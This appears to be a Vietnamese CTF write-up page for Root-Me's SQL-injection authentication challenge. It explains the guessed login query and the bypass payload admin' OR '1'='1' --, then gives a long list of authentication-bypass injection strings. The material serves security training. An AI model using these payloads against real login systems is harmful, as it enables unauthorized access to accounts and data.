<main class="main" role="main">
    <div class="content">
        <article id="post-sqli_authentication" class="article article-type-post" itemscope="" itemtype="http://schema.org/BlogPosting">
            <div class="article-header">
                <h1 class="article-title" itemprop="name">
                    SQLi Authentication
                </h1>
                <div class="article-meta"><a href="?page=<?php echo $parent; ?>"><span>Back To Home</span></a></div>
            </div>
            <div class="article-entry marked-body" itemprop="articleBody">
                <h1 id="Thu-Thach"><a href="#Thu-Thach" class="headerlink" title="Thử Thách"></a>Thử Thách</h1>
                <p>URL: <a href="https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-authentication" target="_blank" rel="noopener">https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-authentication</a></p>
                <h2 id="Mo-ta"><a href="#Mo-ta" class="headerlink" title="Mô tả"></a>Mô tả</h2>
                <p>Retrieve the - administrator password</p>
                <button id="read-writeup"><span><img src="public/images/more.png" /></span>Xem Hướng Dẫn</button>
                <p style="color: red; margin-left: 10px; font-weight: bold">Hãy cố gắng tự làm bằng hết sức mình trước, xem hướng dẫn ngay từ đầu thì bạn sẽ mất nhiều thứ đó..</p>
                <script type="text/javascript">
                    $(document).ready(function(){
                        $("#read-writeup").click(function(){
                            $("#w-content").toggle();
                        });
                    });
                </script>
                <div id="w-content" style="display: none">
                    <h1 id="Huong-Dan"><a href="#Huong-Dan" class="headerlink" title="Hướng Dẫn"></a>Hướng Dẫn</h1>
                    <p>Form đăng nhập bao gồm:</p>
                    <ul>
                        <li>LOGIN</li>
                        <li>PASSWORD</li>
                    </ul>
                    <p>Ta có thể mường tượng ra được câu lệnh SQL:</p>
                    <blockquote>
                        <p>SELECT * FROM USERS WHERE LOGIN='$INPUT_LOGIN' AND PASSWORD='$INPUT_PASSWORD'</p>
                    </blockquote>
                    <p>Còn đoạn code PHP chắc sẽ check tính True False của câu QUERY này.</p>
                    <p>Muốn lấy tài khoản - administrator,ta đoán:</p>
                    <blockquote>
                        <p>LOGIN ='admin'</p>
                    </blockquote>
                    <p>Muốn đăng nhập được,ta phải cho câu query trả về kết quả là True. Bằng cách cho nó <strong>OR True</strong>. (False OR True = True và True OR True = True)<br>Payload:</p>
                    <blockquote>
                        <p>LOGIN = admin' OR '1'='1' --<br>PASSWORD = noimportant</p>
                    </blockquote>
                    <p>Còn sau đây là một số payload để Bypass Authentication trong MSSQL, làm biếng làm thì có thể dùng tool để check nhé:</p>
                    <ul>
                        <li>admin’ –</li>
                        <li>admin’ #</li>
                        <li>admin’/*</li>
                        <li>admin’ or ‘1’=’1</li>
                        <li>admin’ or ‘1’=’1’–</li>
                        <li>admin’ or ‘1’=’1’#</li>
                        <li>admin’ or ‘1’=’1’/*</li>
                        <li>admin’or 1=1 or ‘’=’</li>
                        <li>admin’ or 1=1</li>
                        <li>admin’ or 1=1–</li>
                        <li>admin’ or 1=1#</li>
                        <li>admin’ or 1=1/*</li>
                        <li>admin’) or (‘1’=’1</li>
                        <li>admin’) or (‘1’=’1’–</li>
                        <li>admin’) or (‘1’=’1’#</li>
                        <li>admin’) or (‘1’=’1’/*</li>
                        <li>admin’) or ‘1’=’1</li>
                        <li>admin’) or ‘1’=’1’–</li>
                        <li>admin’) or ‘1’=’1’#</li>
                        <li>admin’) or ‘1’=’1’/*</li>
                        <li>1234 ‘ AND 1=0 UNION ALL SELECT ‘- admin’, ‘81dc9bdb52d04dc20036dbd8313ed055</li>
                        <li>admin” –</li>
                        <li>admin” #</li>
                        <li>admin”/*</li>
                        <li>admin” or “1”=”1</li>
                        <li>admin” or “1”=”1”–</li>
                        <li>admin” or “1”=”1”#</li>
                        <li>admin” or “1”=”1”/*</li>
                        <li>admin”or 1=1 or “”=”</li>
                        <li>admin” or 1=1</li>
                        <li>admin” or 1=1–</li>
                        <li>admin” or 1=1#</li>
                        <li>admin” or 1=1/*</li>
                        <li>admin”) or (“1”=”1</li>
                        <li>admin”) or (“1”=”1”–</li>
                        <li>admin”) or (“1”=”1”#</li>
                        <li>admin”) or (“1”=”1”/*</li>
                        <li>admin”) or “1”=”1</li>
                        <li>admin”) or “1”=”1”–</li>
                        <li>admin”) or “1”=”1”#</li>
                        <li>admin”) or “1”=”1”/*</li>
                        <li>1234 “ AND 1=0 UNION ALL SELECT “- admin”, “81dc9bdb52d04dc20036dbd8313ed055 </li>
                    </ul>
                </div>
            </div>
        </article>
    </div>
</main>